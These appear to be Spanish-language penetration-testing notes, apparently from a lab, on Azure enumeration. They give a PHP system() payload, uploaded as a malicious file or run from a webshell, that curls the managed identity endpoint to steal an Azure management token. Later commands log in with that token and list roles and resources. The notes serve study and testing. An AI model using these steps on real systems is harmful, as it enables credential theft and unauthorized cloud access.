# Enumeración teniendo un Token 

Tags: #Azure #CloudComputing 

## Extraer el Token de sesión

```bash 
# Extraer el Token de rol del aplicativo web 

<?php 
	system('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER');
?>

Nota:
	1. Crear un archivo PHP y subirlo al formulario directamente con el comando 
	2. Crear una Webshell en donde se puedan ejecutar comandos y ahi colocar solo el comando para extraer el Token 
```

## Analizar Token 

* [jwt](https://jwt.io/)

```bash 
Valores importantes en el Token cuando se esta analizando con 'jwt':

1. ObjetId = Es el campo llamado 'sub' en el Token y es el identificador del recurso 
2. Client_id = Es el 'appid' en el Token
```

## Autenticarse con Powershell AZ 

* [Install Azure Powershell on Windows](https://learn.microsoft.com/en-us/powershell/azure/install-azps-windows?view=azps-14.0.0&viewFallbackFrom=azps-13.4.0&tabs=powershell&pivots=windows-msi)

```powershell 
❯ $token="eyJ0eXA...."       # Crear una variable con el token obtenido 

❯ Connect-AzAccount -AccessToken $token -AccountId 'appid'     # Autenticarse a una cuenta de Azure a nivel de recurso 

Notas:
	1. El token fue obtenido con el comando system al subir un archivo malicioso en '3 Attacks - 1 Vector Uploader'
```

## Comandos Powershell AZ 

* [Roles en Azure](https://learn.microsoft.com/en-us/azure/role-based-access-control/built-in-roles)
* [Azure Blob Storage](https://learn.microsoft.com/en-us/azure/storage/blobs/storage-blobs-introduction)

```bash 
Tipos de roles:
1. Reader         = Solo puede mirar 
2. Contributor    = Puede leer y cambiar 
3. Owner          = Puede leer, cambiar y asignar permisos 
```

```powershell 
❯ Get-AzRoleAssignment         # Mirar los roles y recursos asignados verificando el 'ObjectId' 

❯ Get-AzResource               # Listar todos los recursos visibles desde la sesión inicial 
```
